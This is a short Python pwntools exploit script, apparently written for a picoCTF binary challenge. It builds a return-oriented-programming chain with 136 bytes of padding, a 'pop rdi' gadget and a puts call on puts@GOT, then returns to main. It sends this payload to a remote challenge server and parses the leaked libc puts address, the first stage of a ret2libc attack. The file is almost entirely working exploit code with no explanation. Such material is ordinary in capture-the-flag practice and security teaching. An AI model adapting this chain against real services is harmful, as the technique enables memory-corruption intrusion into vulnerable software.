from pwn import *



padding = b"a" * 136
local = ELF("vuln")
libc = ELF("libc.so.6")



# find libc base address
puts_plt = local.plt["puts"]
puts_got = local.got["puts"]
main_offset = local.symbols["main"]

log.info("puts plt: %s", hex(puts_plt))
log.info("puts got: %s", hex(puts_got))

rop_bl = ROP(local)
pop_rdi_g = (rop_bl.find_gadget(["pop rdi", "ret"]))[0]
log.info("pop rdi: %s", hex(pop_rdi_g))

rop_bl.raw(padding)
rop_bl.raw(p64(pop_rdi_g))
rop_bl.raw(p64(puts_got))
rop_bl.raw(p64(puts_plt))
rop_bl.raw(p64(main_offset))


log.info("payload: %s", rop_bl.dump())

r = remote("mercury.picoctf.net", 62289)
r.sendline(rop_bl.chain())

puts_addr_leaked = u64(r.recvlines(3)[2].ljust(8, b"\x00"))
log.info("leaked puts address: %s", hex(puts_addr_leaked))
